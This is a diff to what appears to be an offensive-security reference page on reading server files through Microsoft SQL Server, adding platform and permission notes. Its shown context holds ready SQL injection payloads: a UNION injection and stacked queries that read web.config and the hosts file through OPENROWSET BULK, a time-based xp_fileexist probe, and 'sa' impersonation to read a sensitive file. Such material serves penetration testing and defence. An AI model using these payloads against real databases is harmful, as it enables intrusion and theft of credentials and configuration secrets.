@@ -4,17 +4,19 @@ description: Techniques for reading files from the filesystem using MSSQL
 category: File Operations
 order: 19
 tags: ["file operations", "openrowset", "bulk", "xp_cmdshell"]
-lastUpdated: 2025-12-15
+lastUpdated: 2026-10-08
 ---
 
 Microsoft SQL Server provides several methods to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
+
+`OPENROWSET(BULK ...)`, `xp_fileexist` and `xp_dirtree` work on both Windows and SQL Server for Linux (use the server's native path syntax). `xp_cmdshell` and OLE Automation are Windows-only — they are not supported on SQL Server for Linux. The Windows paths used in the examples are illustrative; on Linux, target paths such as `/var/opt/mssql/...` or `/etc/...`.
 
 ## Prerequisites
 
 To read files from MSSQL, you typically need one of the following:
 
-1. `sysadmin` role membership (for xp_cmdshell)
-2. `ADMINISTER BULK OPERATIONS` permission (for OPENROWSET BULK)
+1. `sysadmin` role membership for `xp_cmdshell` (or an `EXECUTE` grant on it with a `##xp_cmdshell_proxy_account##` credential)
+2. For OPENROWSET BULK on Windows, `ADMINISTER BULK OPERATIONS` (or `ADMINISTER DATABASE BULK OPERATIONS`); files are read as the SQL Server service account for SQL logins and with the caller's own Windows account for Windows logins. On Linux it takes `sysadmin` in practice: SQL Server 2017 and 2019 reject the permission and the `bulkadmin` role ("not supported on the 'Linux' platform"), and 2022 accepts them, but a non-sysadmin login still could not read files that `sysadmin` could (tested on 2022 CU27)
 3. Ad hoc distributed queries enabled (for some OPENROWSET methods)
 
 ## OPENROWSET BULK
@@ -107,7 +109,7 @@ SELECT * FROM #dirs WHERE isfile = 1;
 
 ## OLE Automation (sp_OACreate)
 
-Use FileSystemObject for file operations:
+Use FileSystemObject for file operations. It is off by default and Windows-only (on Linux, enabling `Ole Automation Procedures` fails with Msg 15392), and calling `sp_OACreate` needs `sysadmin` or an explicit `EXECUTE` grant on it.
 
 ```sql
 -- Enable OLE Automation
@@ -152,13 +154,13 @@ Verify paths on the target system using directory listing (`xp_dirtree`, `xp_cmd
 ## SQL Injection Examples
 
 ```sql
--- Read file via UNION injection
+-- Read file via UNION injection (string context, 3-column query, column 2 is displayed)
 ' UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x--
 
--- Check file existence via blind injection (time-based)
+-- Check file existence via stacked query (time-based; fires even if the WHERE matches no row)
 '; DECLARE @x INT; EXEC xp_fileexist 'C:\inetpub\wwwroot\web.config', @x OUTPUT; IF @x=1 WAITFOR DELAY '0:0:5'--
 
--- Stacked query to read file
+-- Stacked query to read file (returns a second result set; only useful if the application reads it)
 '; SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
 
 -- Using xp_cmdshell in injection
@@ -203,6 +205,8 @@ EXECUTE AS LOGIN = 'sa';
 SELECT * FROM OPENROWSET(BULK 'C:\sensitive\file.txt', SINGLE_CLOB) AS x;
 REVERT;
 ```
+
+Impersonating a login requires `IMPERSONATE` permission on it; impersonating `sa` effectively requires `CONTROL SERVER` (sysadmin), so this helps only when you already hold a login that can impersonate a higher-privileged one.
 
 ## Mitigation
 
